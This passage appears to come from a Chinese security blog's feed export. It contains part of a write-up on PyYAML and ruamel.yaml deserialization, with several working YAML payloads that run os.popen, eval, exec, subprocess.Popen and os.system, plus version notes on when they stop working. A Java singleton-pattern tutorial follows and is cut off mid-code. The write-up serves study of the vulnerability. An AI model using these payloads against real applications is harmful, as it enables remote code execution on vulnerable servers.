class="string">&#x27;ImportError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ImportWarning&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;IndentationError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;IndexError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;InterruptedError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;IsADirectoryError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;KeyError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;KeyboardInterrupt&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;LookupError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;MemoryError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ModuleNotFoundError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NameError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NotADirectoryError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NotImplementedError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;OSError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;OverflowError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;PermissionError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ProcessLookupError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;RecursionError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ReferenceError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ResourceWarning&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;RuntimeError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;RuntimeWarning&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;StopAsyncIteration&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;StopIteration&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;SyntaxError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;SyntaxWarning&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;SystemError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;SystemExit&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;TabError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;TimeoutError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;TypeError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;UnboundLocalError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeDecodeError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeEncodeError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeTranslateError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;UnicodeWarning&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;UserWarning&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ValueError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;Warning&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;OSError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ZeroDivisionError&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bool&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;filter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;map&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;range&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;zip&#x27;</span>&gt;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>现在就是找可以利用的类了，继续回到我们的constructor.py中，</p><p>进一步审计 construct_python_object_apply()时，存在一个漏洞点</p><p>果listitems不为空，则调用instance的extend()方法，将listitems中的所有元素添加到instance列表对象的末尾，instance是我们创建的实例，这里并没有定义listitems是什么，如果我们的listitems是一个字典，而且其内容有”{‘extend’:function}”，这样的话，我们就可以利用extend进行任意函数的执行了。</p><p>但是，经过测试，我发现上面 builtins 中的这些类中，只有frozenset,bytes,tuple这三个类可以进行命令执行，为了搞清楚为什么，我们继续审计源码。</p><p>我们接着看 <code>make_python_instance()</code></p><p>这里只要我们的内置类可以执行<code>cls.__new__(cls, *args, **kwds)</code>这段代码，就可以根据参数来动态创建新的Python对象，从而进行命令执行。</p><p>所以猜测frozenset,bytes,tuple应该是可以执行上述代码，所以可以进行命令执行的</p><p>测试payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!!python/<span class="built_in">object</span>/new:<span class="built_in">frozenset</span>  </span><br><span class="line">- !!python/<span class="built_in">object</span>/new:<span class="built_in">map</span>  </span><br><span class="line">  - !!python/name:os.popen  </span><br><span class="line">  - [<span class="string">&quot;bash /app/fileinfo/cmd&quot;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!!python/<span class="built_in">object</span>/new:<span class="built_in">tuple</span>  </span><br><span class="line">        - !!python/<span class="built_in">object</span>/new:<span class="built_in">map</span>  </span><br><span class="line">          - !!python/name:<span class="built_in">eval</span>  </span><br><span class="line">          - [<span class="string">&quot;print(123)&quot;</span>]</span><br></pre></td></tr></table></figure><p>再附上一些网上存在的 payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#报错但是执行了</span></span><br><span class="line">- !!python/<span class="built_in">object</span>/new:<span class="built_in">str</span></span><br><span class="line">    args: []</span><br><span class="line">    state: !!python/<span class="built_in">tuple</span></span><br><span class="line">    - <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span></span><br><span class="line">    - !!python/<span class="built_in">object</span>/new:<span class="built_in">staticmethod</span></span><br><span class="line">      args: [<span class="number">0</span>]</span><br><span class="line">      state:</span><br><span class="line">        update: !!python/name:<span class="built_in">exec</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- !!python/<span class="built_in">object</span>/new:yaml.MappingNode</span><br><span class="line">  listitems: !!<span class="built_in">str</span> <span class="string">&#x27;!!python/object/apply:subprocess.Popen [whoami]&#x27;</span></span><br><span class="line">  state:</span><br><span class="line">    tag: !!<span class="built_in">str</span> dummy</span><br><span class="line">    value: !!<span class="built_in">str</span> dummy</span><br><span class="line">    extend: !!python/name:yaml.unsafe_load</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数</span></span><br><span class="line">!!python/<span class="built_in">object</span>/new:<span class="built_in">type</span></span><br><span class="line">  args: [<span class="string">&quot;z&quot;</span>, !!python/<span class="built_in">tuple</span> [], &#123;<span class="string">&quot;extend&quot;</span>: !!python/name:<span class="built_in">exec</span> &#125;]</span><br><span class="line">  listitems: <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p>PS:</p><p>当利用上述payload测试到5.2b1版本时，发现无法利用针对!!python&#x2F;object&#x2F;apply标签的payload了，别的都可以利用</p><p>上述payload当我测试到5.4b1版本时，发现只有利用<code>针对!!python/name标签</code>的payload可以命令执行，别的payload都不能用了</p><p>当版本大于等于5.3.1：<a class="link" href="https://github.com/yaml/pyyaml/pull/386">https://github.com/yaml/pyyaml/pull/386<i class="fas fa-external-link-alt"></i></a></p><p>当版本大于等于6.0： <a class="link" href="https://github.com/yaml/pyyaml/pull/386">https://github.com/yaml/pyyaml/pull/386<i class="fas fa-external-link-alt"></i></a></p><h3 id="3-利用ruamel-yaml读写yaml文件"><a href="#3-利用ruamel-yaml读写yaml文件" class="headerlink" title="3. 利用ruamel.yaml读写yaml文件"></a>3. 利用ruamel.yaml读写yaml文件</h3><p>在网上搜资料的时候，Evi1s7 师傅发现了也可以利用 ruamel.yaml 读写 yaml 文件，进行测试一下。</p><p>这里还是沿用 PyYaml&gt;5.1 的 poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ruamel.yaml</span><br><span class="line"></span><br><span class="line">poc= <span class="string">b&quot;&quot;&quot;!!python/object/apply:os.system</span></span><br><span class="line"><span class="string">- calc&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">ruamel.yaml.load(poc)</span><br></pre></td></tr></table></figure><p>虽然回显报错，但是仍然可以执行，所以利用ruamel.yaml读写yaml文件也是存在上述的漏洞的，这里就不再测试。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>入职后实在是没精力写这些文章了，时间太碎了，后续或许有时间会再回过头来看看</p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a class="link" href="https://xz.aliyun.com/t/12481">https://xz.aliyun.com/t/12481<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/">https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Python yaml 反序列化&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://drun1baby.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="web安全" scheme="https://drun1baby.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java 设计模式之单例模式</title>
    <link href="https://drun1baby.github.io/2023/06/01/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"/>
    <id>https://drun1baby.github.io/2023/06/01/Java-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</id>
    <published>2023-06-01T01:03:57.000Z</published>
    <updated>2023-06-01T01:05:15.706Z</updated>
    
    <content type="html"><![CDATA[<p>Java 设计模式之单例模式</p><span id="more"></span><h1 id="Java-设计模式之单例模式"><a href="#Java-设计模式之单例模式" class="headerlink" title="Java 设计模式之单例模式"></a>Java 设计模式之单例模式</h1><h2 id="0x01-认识单例模式"><a href="#0x01-认识单例模式" class="headerlink" title="0x01 认识单例模式"></a>0x01 认识单例模式</h2><h3 id="什么是单例模式"><a href="#什么是单例模式" class="headerlink" title="什么是单例模式"></a>什么是单例模式</h3><p>单例设计模式，就是采取一定的方法保证在整个的软件系统中，对某个类只能存在一个对象实例，并且该类只提供一个取得其对象实例的方法（静态方法）。</p><p>比如 <code>Hibernate</code> 类的 <code>SessionFactory</code>，它充当数据存储源的代理，并负责创建 Session 对象。<code>SessionFactory</code> 并不是轻量级的，一般情况下，一个项目通常只需要一个 <code>SessionFactory</code> 就够了，这时就会使用到单例模式。</p><p>单例模式有八种方式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 饿汉式（静态常量）；</span><br><span class="line">2. 饿汉式（静态代码块）；</span><br><span class="line">3. 懒汉式（线程不安全）；</span><br><span class="line">4. 懒汉式（线程安全，同步方法）；</span><br><span class="line">5. 懒汉式（线程安全，同步代码块）；</span><br><span class="line">6. 双重检查；</span><br><span class="line">7. 静态内部类；</span><br><span class="line">8. 枚举</span><br></pre></td></tr></table></figure><h2 id="0x02-八种单例模式详解"><a href="#0x02-八种单例模式详解" class="headerlink" title="0x02 八种单例模式详解"></a>0x02 八种单例模式详解</h2><h3 id="饿汉式（静态常量）"><a href="#饿汉式（静态常量）" class="headerlink" title="饿汉式（静态常量）"></a>饿汉式（静态常量）</h3><p>比较简单，也就是定义一个静态常量，让它成为 <code>new Singleton()</code> 的对象实例</p><p>代码演示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> HungryManStyle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingletonTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> Singleton.getInstance();</span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance2</span> <span class="operator">=</span> Singleton.getInstance();</span><br><span class="line">        System.out.println(instance == instance2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//饿汉式（静态常量）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="comment">//1、构造器私有化，外部不能 new</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2、本类内部创建对象实例</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3、提供一个公有的静态方法，返回实例对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优缺点说明：</strong></p><ul><li>优点：这种写法比较简单，就是在类装载的时候就完成实例化，避免了线程同步问题；</li><li>缺点：在类装载的时候就完成实例化，没有达到懒加载的效果，如果从始至终从未使用过这个实例，则会造成内存的浪费；</li><li>这种方式基于 ClassLoader 机制避免了多线程的同步问题，不过，instance 在类装载时就实例化，在单例模式中大多数都是调用 <code>getInstance()</code> 方法，但是导致类装载的原因有很多种，因此不能确定有其他的方式（或者其他静态方法）导致类加载，这时候初始化 instance 就没有达到懒加载的效果。</li><li>结论：这种单例模式可用，可能造成内存浪费。</li></ul><h3 id="饿汉式（静态代码块）"><a href="#饿汉式（静态代码块）" class="headerlink" title="饿汉式（静态代码块）"></a>饿汉式（静态代码块）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> HungryManStyle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingletonTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> Singleton.getInstance();</span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance2</span> <span class="operator">=</span> Singleton.getInstance();</span><br><span class="line">        System.out.println(instance == instance2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//饿汉式（静态代码块）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton2</span> &#123;</span><br><span class="line">    <span class="comment">//1、构造器私有化，外部不能new</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton2</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2、静态代码块</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton2 instance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        instance = <span class="keyword">new</span> <span class="title class_">Singleton2</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3、提供一个公有的静态方法，返回实例对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton2 <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>优缺点说明：</strong></p><ul><li>这种方式和上面的方式其实类似，只不过将类实例化的过程放在了静态代码块中，也是在类装载的时候，就执行静态代码快中的代码，初始化类的实例。优缺点和上面是一样的。</li><li>结论：这种单例模式可用，但是可能造成内存浪费。</li></ul><h3 id="懒汉式（线程不安全）"><a href="#懒汉式（线程不安全）" class="headerlink" title="懒汉式（线程不安全）"></a>懒汉式（线程不安全）</h3><p><strong>代码演示：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> HungryManStyle;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingletonTest3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> Singleton.getInstance();  </span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance2</span> <span class="operator">=</span> Singleton.getInstance();  </span><br><span class="line">        System.out.println(instance == instance2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//懒汉式（线程不安全）  </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton3</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton3 instance;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton3</span><span class="params">()</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//提供一个静态的公有方法，当使用到该方法时，才去创建instance  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton3 <span class="title function_">getInstance</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;  </span><br><span class="line">            instance = <span class="keyword">new</span> <span class="title class_">Singleton3</span>();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> instance;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优缺点说明：</strong></p><ul><li>解决了线程安全问题；</li><li>效率太低了，每个线程在想获得类的实例的时候，执行getInstance（）方法都要进行同步。而其实这个方法只执行一次实例化代码就够了，后面的想获得该类实例，直接return就行了。方法进行同步效率太低；</li><li>结论：在实际开发中，不推荐使用这种方式。</li></ul><h3 id="懒汉式（线程安全，同步方法）"><a href="#懒汉式（线程安全，同步方法）" class="headerlink" title="懒汉式（线程安全，同步方法）"></a>懒汉式（线程安全，同步方法）</h3><p><strong>代码演示：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingletonTest4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> Singleton.getInstance();</span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance2</span> <span class="operator">=</span> Singleton.getInstance();</span><br><span class="line">        System.out.println(instance == instance2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//懒汉式（线程安全，同步方法）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//提供一个静态的公有方法，加入同步处理的代码，解决线程安全问题</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优缺点说明：</strong></p><ul><li>解决了线程安全问题；</li><li>效率太低了，每个线程在想获得类的实例的时候，执行getInstance（）方法都要进行同步。而其实这个方法只执行一次实例化代码就够了，后面的想获得该类实例，直接return就行了。方法进行同步效率太低；</li><li>结论：在实际开发中，不推荐使用这种方式。</li></ul><h3 id="懒汉式（线程安全，同步代码块）"><a href="#懒汉式（线程安全，同步代码块）" class="headerlink" title="懒汉式（线程安全，同步代码块）"></a>懒汉式（线程安全，同步代码块）</h3><p><strong>代码演示：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> HungryManStyle;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingletonTest4</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> Singleton.getInstance();  </span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">instance2</span> <span class="operator">=</span> Singleton.getInstance();  </span><br><span class="line">        System.out.println(instance == instance2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//懒汉式（线程安全，同步代码块）  </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton4</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton4 instance;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton4</span><span class="params">()</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton4 <span class="title function_">getInstance</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton4.class) &#123;  </span><br><span class="line">                instance = <span class="keyword">new</span> <span class="title class_">Singleton4</span>();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        